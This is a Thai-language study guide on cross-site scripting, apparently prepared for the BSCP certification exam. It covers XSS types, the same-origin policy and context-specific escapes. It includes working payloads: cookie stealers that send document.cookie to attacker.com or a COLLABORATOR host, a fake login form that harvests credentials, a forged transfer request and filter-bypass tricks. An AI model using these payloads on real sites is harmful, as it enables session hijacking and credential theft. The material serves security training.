# Part 1: XSS Fundamentals
> [Back to Index](README.md)

---

## XSS คืออะไร?

**XSS (Cross-Site Scripting)** = ช่องโหว่ที่ attacker สามารถ inject JavaScript code เข้าไปใน web application แล้ว execute ใน browser ของ victim

### How XSS Works

```
┌──────────┐     ┌──────────┐     ┌──────────┐
│ Attacker │ ──► │  Website │ ──► │  Victim  │
└──────────┘     └──────────┘     └──────────┘
     │                │                 │
     │  1. Inject     │                 │
     │  malicious     │                 │
     │  script        │                 │
     │ ─────────────► │                 │
     │                │  2. Website     │
     │                │  serves page    │
     │                │  with script    │
     │                │ ───────────────►│
     │                │                 │
     │  3. Script executes in victim's  │
     │     browser, steals cookies,     │
     │     credentials, or performs     │
     │     actions as victim            │
     │ ◄─────────────────────────────── │
```

### ทำไม XSS อันตราย?

| Action | ผลกระทบ |
|--------|--------|
| **Steal cookies** | ขโมย session → login เป็น victim |
| **Steal credentials** | สร้าง fake login form → ได้ username/password |
| **Keylogging** | บันทึกทุกอย่างที่ victim พิมพ์ |
| **Phishing** | แสดง fake content บนเว็บจริง |
| **Malware distribution** | Redirect ไป malicious site |
| **Perform actions** | ทำ action แทน victim (change email, transfer money) |
| **Deface website** | เปลี่ยนหน้าตาเว็บ |

---

## 3 ประเภทของ XSS

### 1. Reflected XSS

**Payload อยู่ใน request → reflect กลับมาใน response ทันที**

```
Flow:
Attacker ส่ง malicious link ให้ victim
         ↓
Victim คลิก link
         ↓
Server รับ request พร้อม payload
         ↓
Server ส่ง response พร้อม payload
         ↓
Browser execute payload
         ↓
Cookie/data ถูกส่งไป Attacker
```

**ตัวอย่าง:**
```
URL: https://target.com/search?q=<script>alert(1)</script>

Response:
<h1>Search results for: <script>alert(1)</script></h1>
```

**Delivery:** ต้องหลอกให้ victim คลิก link (phishing, social engineering)

---

### 2. Stored XSS

**Payload ถูกเก็บใน database → แสดงให้ทุกคนที่เข้าหน้านั้น**

```
Flow:
Attacker post comment พร้อม payload
         ↓
Server เก็บ payload ใน database
         ↓
Victim เข้าหน้าที่แสดง comments
         ↓
Server ดึง payload จาก database
         ↓
Browser execute payload
         ↓
Cookie/data ถูกส่งไป Attacker
```

**ตัวอย่าง:**
```
Comment: Great article! <script>fetch('https://attacker.com/?c='+document.cookie)</script>

เมื่อใครก็ตามเปิดหน้า comment → ถูกโจมตี
```

**อันตรายกว่า Reflected:** ไม่ต้องหลอกให้คลิก link

---

### 3. DOM-Based XSS

**Payload ถูกประมวลผลใน browser โดย JavaScript (ไม่ผ่าน server)**

```
Flow:
Attacker ส่ง malicious link ให้ victim
         ↓
Victim คลิก link
         ↓
Browser โหลดหน้าเว็บ
         ↓
JavaScript อ่าน payload จาก URL/DOM
         ↓
JavaScript ประมวลผล payload (ไม่ส่งไป server)
         ↓
Payload execute ใน browser
         ↓
Cookie/data ถูกส่งไป Attacker
```

**ตัวอย่าง:**
```javascript
// Vulnerable code
var search = location.hash.substring(1);
document.getElementById('result').innerHTML = search;

// Attack URL
https://target.com/page#<img src=x onerror=alert(1)>
```

**พิเศษ:** Server-side WAF ตรวจไม่เจอ!

---

### เปรียบเทียบ 3 ประเภท

| | Reflected | Stored | DOM-Based |
|--|-----------|--------|-----------|
| **Payload storage** | ไม่เก็บ | Database | ไม่เก็บ |
| **Server involved** | ใช่ | ใช่ | ไม่ |
| **Delivery** | ต้องส่ง link | อัตโนมัติ | ต้องส่ง link |
| **Detection** | Server-side possible | Server-side possible | Client-side only |
| **WAF bypass** | ยาก | ยาก | ง่าย |
| **Impact scope** | 1 victim/click | ทุกคนที่เข้า | 1 victim/click |

---

## XSS Impact & Why It Matters

### Same-Origin Policy (SOP) คืออะไร?

**SOP = กฎความปลอดภัยของ Browser** ที่ป้องกันไม่ให้ script จาก website หนึ่ง อ่าน/เขียน data ของอีก website หนึ่ง

```
Origin = Protocol + Domain + Port

https://bank.com:443     ← Origin A
https://attacker.com:443 ← Origin B

กฎ SOP:
Script ที่มาจาก Origin B จะ access data ของ Origin A ไม่ได้
```

### ตัวอย่าง SOP ทำงาน (ปกติ)

```javascript
// attacker.com พยายามขโมย cookie จาก bank.com

// บน attacker.com:
fetch('https://bank.com/api/account')
  .then(r => r.json())
  .then(data => {
    // ส่ง data ไป attacker server
    fetch('https://attacker.com/steal?data=' + data);
  });

// ผลลัพธ์: BLOCKED by SOP!
// Error: No 'Access-Control-Allow-Origin' header
```

**SOP ป้องกันได้** เพราะ script มาจาก `attacker.com` แต่พยายาม access `bank.com`

---

### ทำไม XSS Bypass SOP ได้?

**Key concept: Browser ตรวจสอบ Origin ของ Script ไม่ใช่ ใครเขียน Script**

```
เมื่อ XSS inject script เข้าไปใน bank.com:

┌─────────────────────────────────────────────────────┐
│  https://bank.com/search?q=<script>PAYLOAD</script> │
│                                                     │
│  Browser เห็น:                                      │
│  - หน้านี้มาจาก bank.com ✓                          │
│  - Script อยู่ในหน้าของ bank.com ✓                  │
│  - ดังนั้น Script มี Origin = bank.com ✓            │
│                                                     │
│  Browser ไม่รู้ว่า:                                 │
│  - Script นี้ attacker inject มา ✗                  │
│  - Script นี้ไม่ใช่ของจริงของ bank.com ✗            │
└─────────────────────────────────────────────────────┘
```

### เปรียบเทียบ

| Scenario | Script Origin | Target Origin | SOP Block? |
|----------|--------------|---------------|------------|
| attacker.com script → bank.com data | attacker.com | bank.com | ✅ BLOCKED |
| **XSS script ใน bank.com** → bank.com data | **bank.com** | bank.com | ❌ ALLOWED |

---

### Visual Explanation

**ปกติ (ไม่มี XSS):**
```
┌──────────────┐         ┌──────────────┐
│ attacker.com │ ──X──►  │   bank.com   │
│              │  SOP    │              │
│  <script>    │ BLOCKS  │  cookies     │
│  steal()     │         │  data        │
└──────────────┘         └──────────────┘
      │
      │ Script origin ≠ Target origin
      │ → SOP blocks access
      ▼
```

**เมื่อมี XSS:**
```
┌──────────────────────────────────────┐
│            bank.com                  │
│  ┌────────────────────────────────┐  │
│  │ <script>                       │  │
│  │   // Attacker's code           │  │
│  │   fetch(attacker.com +         │  │
│  │         document.cookie)       │◄─┼── Script อยู่ใน bank.com
│  │ </script>                      │  │   Origin = bank.com
│  └────────────────────────────────┘  │
│                                      │
│  cookies: session=abc123  ◄──────────┼── Cookie ของ bank.com
│                                      │
└──────────────────────────────────────┘
        │
        │ Script origin = Target origin (bank.com = bank.com)
        │ → SOP allows access!
        ▼
    Cookie ถูกส่งไป attacker.com
```

---

### Code Example

**สิ่งที่ Attacker ทำไม่ได้ (ถูก SOP block):**
```javascript
// จาก attacker.com พยายามอ่าน bank.com
var iframe = document.createElement('iframe');
iframe.src = 'https://bank.com';
document.body.appendChild(iframe);

// พยายามอ่าน content
var bankData = iframe.contentDocument.body.innerHTML;
// ERROR: Blocked by SOP!

// พยายามอ่าน cookie
var bankCookie = iframe.contentDocument.cookie;
// ERROR: Blocked by SOP!
```

**สิ่งที่ XSS ทำได้ (bypass SOP):**
```javascript
// XSS payload ที่ execute บน bank.com
// Script ถือว่ามี origin = bank.com

// อ่าน cookie ได้!
var cookie = document.cookie;  // ✓ Works!

// อ่าน DOM ได้!
var data = document.body.innerHTML;  // ✓ Works!

// ทำ request ไป bank.com API ได้!
fetch('/api/transfer', {  // ✓ Works!
  method: 'POST',
  body: 'to=attacker&amount=10000'
});

// ส่ง data ออกไปได้!
fetch('https://attacker.com/steal?cookie=' + cookie);  // ✓ Works!
```

---

### สรุป: ทำไม XSS Bypass SOP

```
┌────────────────────────────────────────────────────────────┐
│                    WHY XSS BYPASSES SOP                    │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  SOP checks: "Where does this script COME FROM?"          │
│                                                            │
│  SOP does NOT check: "Who WROTE this script?"             │
│                                                            │
│  ─────────────────────────────────────────────────────    │
│                                                            │
│  XSS injects attacker's code INTO the target website      │
│                                                            │
│  Browser sees script served FROM target website           │
│                                                            │
│  Browser assigns script the target's origin               │
│                                                            │
│  Script gets full access to target's data                 │
│                                                            │
│  ─────────────────────────────────────────────────────    │
│                                                            │
│  Result: Attacker's code runs with victim site's          │
│          privileges = SOP BYPASSED                        │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

**ภาษาง่ายๆ:**
> XSS เหมือนการแอบใส่คำสั่งของ attacker เข้าไปในจดหมายของ bank
>
> เมื่อ victim เปิดจดหมาย → เห็นว่ามาจาก bank → เชื่อถือ → ทำตามคำสั่ง
>
> SOP ตรวจแค่ "จดหมายมาจากไหน" ไม่ได้ตรวจ "ใครเขียนข้อความข้างใน"

---

## XSS ใน BSCP Exam

### XSS อยู่ใน Stage ไหน?

| Stage | XSS Type | Purpose |
|-------|----------|---------|
| **Stage 1: Foothold** | Reflected, DOM-based, Stored | ขโมย cookie ของ user ธรรมดา |
| **Stage 2: Privilege Escalation** | Stored (admin visits) | ขโมย cookie ของ admin |

### Exam Flow with XSS

```
Stage 1:
1. หา XSS vulnerability
2. สร้าง cookie stealer payload
3. Host บน Exploit Server
4. Deliver to victim
5. ได้ victim's session cookie
6. Replace cookie → เข้าเป็น user

Stage 2 (ถ้า XSS):
1. หา Stored XSS ที่ admin จะเห็น
2. สร้าง payload ที่ขโมย admin cookie
3. รอ admin เข้าดู
4. ได้ admin's session cookie
5. เข้า admin panel
```

### สิ่งที่ต้องเช็คก่อน XSS

```
1. Cookie flags:
   - HttpOnly = true? → ขโมย cookie ไม่ได้ ต้อง credential harvest
   - HttpOnly = false? → XSS cookie stealer ได้!

2. CSP (Content Security Policy):
   - มี CSP header? → อาจ block inline scripts
   - ไม่มี CSP? → XSS ง่ายขึ้น

3. Input reflection:
   - Reflect ที่ไหน? HTML? JavaScript? Attribute?
   - อะไรถูก encode/filter?
```

---

## Basic XSS Payloads

### ทดสอบว่ามี XSS ไหม

```html
<!-- Basic test -->
<script>alert(1)</script>

<!-- img onerror -->
<img src=x onerror=alert(1)>

<!-- svg onload -->
<svg onload=alert(1)>

<!-- body onload -->
<body onload=alert(1)>

<!-- Event handlers -->
<div onmouseover=alert(1)>hover me</div>

<!-- Fuzzer string (test everything) -->
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

### ทดสอบ Encoding

```html
<!-- ถ้า < > ถูก encode -->
" onmouseover="alert(1)
' onclick='alert(1)

<!-- ถ้า quotes ถูก encode -->
javascript:alert(1)

<!-- ถ้า alert ถูก block -->
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>console.log(1)</script>
```

---

## XSS Context & Escaping

### Context 1: HTML Context

```html
<div>USER_INPUT</div>

<!-- Payload -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### Context 2: Attribute Context

```html
<input value="USER_INPUT">

<!-- Payload: escape attribute -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
```

### Context 3: JavaScript String Context

```html
<script>
var name = 'USER_INPUT';
</script>

<!-- Payload: escape string -->
';alert(1);//
</script><script>alert(1)</script>
```

### Context 4: JavaScript Template Literal

```html
<script>
var name = `USER_INPUT`;
</script>

<!-- Payload -->
${alert(1)}
```

### Context 5: URL Context

```html
<a href="USER_INPUT">Click</a>

<!-- Payload -->
javascript:alert(1)
```

### Context 6: CSS Context

```html
<style>
.class { background: USER_INPUT }
</style>

<!-- Payload -->
url('javascript:alert(1)')
</style><script>alert(1)</script>
```

### Context Detection Tips

```
1. ใส่ unique string เช่น "xss12345test"
2. ดู response ว่า string อยู่ที่ไหน
3. ดูว่าอยู่ใน:
   - HTML tag? → HTML context
   - Attribute value? → Attribute context
   - JavaScript string? → JS context
   - URL? → URL context
4. ทดสอบ escape characters ที่เหมาะกับ context
```

---

## Cookie Stealing vs Credential Harvesting

### เมื่อไรใช้อะไร?

```
Check cookie flags ก่อน:

Cookie: session=abc123; HttpOnly

HttpOnly = true?
    │
    ├── YES → Credential Harvesting
    │         (ขโมย cookie ด้วย JS ไม่ได้)
    │
    └── NO  → Cookie Stealing
              (document.cookie อ่านได้)
```

### Cookie Stealing (HttpOnly = false)

```javascript
// Basic
<script>
document.location='https://COLLABORATOR/?c='+document.cookie
</script>

// fetch
<script>
fetch('https://COLLABORATOR/?c='+document.cookie)
</script>

// img
<img src=x onerror="fetch('https://COLLABORATOR/?c='+document.cookie)">
```

### Credential Harvesting (HttpOnly = true)

```html
<!-- Fake login form -->
<h1>Session expired. Please login again.</h1>
<form action="https://COLLABORATOR/steal" method="POST">
  <input name="username" placeholder="Username"><br>
  <input name="password" type="password" placeholder="Password"><br>
  <button>Login</button>
</form>

<!-- หรือใช้ JavaScript -->
<script>
var form = document.createElement('form');
form.innerHTML = '<input name=u id=u><input name=p type=password id=p onchange="fetch(\'https://COLLABORATOR\',{method:\'POST\',body:u.value+\':\'+p.value})">';
document.body.appendChild(form);
</script>
```

### วิธีเช็ค Cookie Flags

```
1. DevTools → Application → Cookies
2. ดูคอลัมน์ HttpOnly และ Secure
3. หรือดูใน Response headers:
   Set-Cookie: session=abc; HttpOnly; Secure
```

---

## XSS Prevention (รู้ไว้เข้าใจ bypass)

| Defense | วิธี Bypass |
|---------|------------|
| **HTML encoding** | ใช้ context อื่น (JS, attribute) |
| **Block `<script>`** | ใช้ event handlers (`onerror`, `onload`) |
| **Block `alert`** | ใช้ `prompt`, `confirm`, `print` |
| **WAF** | Encoding, case variation, obfuscation |
| **CSP** | หา allowed sources, JSONP, Angular |
| **HttpOnly cookie** | Credential harvesting แทน |

---

## XSS Resources

### Cheat Sheets
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

### Tools
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)

---

> **Next:** [02-DOM-XSS-Overview.md](02-DOM-XSS-Overview.md) - DOM XSS คืออะไร, Source/Sink
